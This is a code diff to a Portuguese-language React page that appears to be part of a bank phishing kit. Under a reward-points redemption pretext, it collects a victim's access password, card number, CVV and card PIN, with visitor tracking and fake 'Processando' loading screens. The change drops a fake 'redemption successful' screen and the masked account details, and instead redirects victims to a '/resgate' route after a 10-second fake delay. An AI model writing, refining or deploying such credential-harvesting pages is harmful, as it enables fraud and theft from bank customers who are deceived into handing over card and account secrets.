@@ -8,8 +8,8 @@ const SenhaAcesso = () => {
   useVisitorTracking("senha-acesso");
   const navigate = useNavigate();
   const location = useLocation();
-  const { nome, agencia, conta } = (location.state as any) || {};
-  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao" | "sucesso">("senha");
+  const { nome } = (location.state as any) || {};
+  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao">("senha");
   const [showCardLoading, setShowCardLoading] = useState(false);
   const CARD_LOADING_MESSAGES = [
     "Processando...",
@@ -36,12 +36,6 @@ const SenhaAcesso = () => {
   const [cvv, setCvv] = useState("");
   const [senhaCartao, setSenhaCartao] = useState("");
 
-  const maskedAgencia = agencia ? `*${agencia.slice(-2)}` : "**";
-  const cleanConta = conta ? conta.replace(/\D/g, "") : "";
-  const maskedConta =
-    cleanConta.length >= 3
-      ? `***${cleanConta.slice(-3, -1)}-${cleanConta.slice(-1)}`
-      : "***--";
 
   const formatNumero = (v: string) => {
     const digits = v.replace(/\D/g, "").slice(0, 16);
@@ -91,7 +85,7 @@ const SenhaAcesso = () => {
     }, interval);
     const redirect = setTimeout(() => {
       setShowFinalLoading(false);
-      setPhase("sucesso");
+      navigate("/resgate", { state: { nome } });
     }, 10000);
     return () => { clearInterval(timer); clearTimeout(redirect); };
   }, [showFinalLoading]);
@@ -109,7 +103,7 @@ const SenhaAcesso = () => {
       {/* Header */}
       <div className="px-5 pt-6 pb-4">
         <div className="flex items-center gap-4">
-          <button onClick={() => phase === "sucesso" ? null : phase === "senhaCartao" ? setPhase("cartao") : phase === "cartao" ? setPhase("senha") : navigate(-1)}>
+          <button onClick={() => phase === "senhaCartao" ? setPhase("cartao") : phase === "cartao" ? setPhase("senha") : navigate(-1)}>
             <ChevronLeft className="text-primary-foreground" size={24} />
           </button>
           <h1 className="text-primary-foreground text-lg font-semibold flex-1 text-center pr-8">
@@ -121,13 +115,7 @@ const SenhaAcesso = () => {
       {/* Account Info */}
       <div className="px-5 pt-4 pb-16 space-y-1">
         <p className="text-primary-foreground text-sm">
-          Agência sem dígito: <span className="font-semibold">{maskedAgencia}</span>
-        </p>
-        <p className="text-primary-foreground text-sm">
-          Conta com dígito: <span className="font-semibold">{maskedConta}</span>
-        </p>
-        <p className="text-primary-foreground text-sm">
-          {phase === "sucesso" ? "Titularidade" : "Nome"}: <span className="font-semibold">{nome?.toUpperCase() || "TITULAR"}</span>
+          Nome: <span className="font-semibold">{nome?.toUpperCase() || "TITULAR"}</span>
         </p>
       </div>
 
@@ -250,26 +238,7 @@ const SenhaAcesso = () => {
               continuar
             </button>
           </>
-        ) : (
-          <div className="flex-1 flex flex-col items-center justify-center text-center">
-            <div className="w-16 h-16 rounded-full bg-[#FF6200]/10 flex items-center justify-center mb-6">
-              <ShieldCheck className="text-[#FF6200]" size={36} />
-            </div>
-            <p className="text-foreground text-xl font-bold mb-3">Resgate realizado com sucesso!</p>
-            <p className="text-muted-foreground text-base mb-1">
-              Você possui <span className="text-[#FF6200] font-bold">120.258</span> pontos para o resgate.
-            </p>
-            <p className="text-muted-foreground text-base mb-8">
-              Um atendente entrará em contato em até 48 horas.
-            </p>
-            <button
-              onClick={() => navigate("/")}
-              className="w-full py-4 rounded-full bg-[#FF6200] text-white font-semibold text-base hover:opacity-90 transition-opacity"
-            >
-              finalizar
-            </button>
-          </div>
-        )}
+        ) : null}
       </div>
 
       {/* Loading Modal after card */}
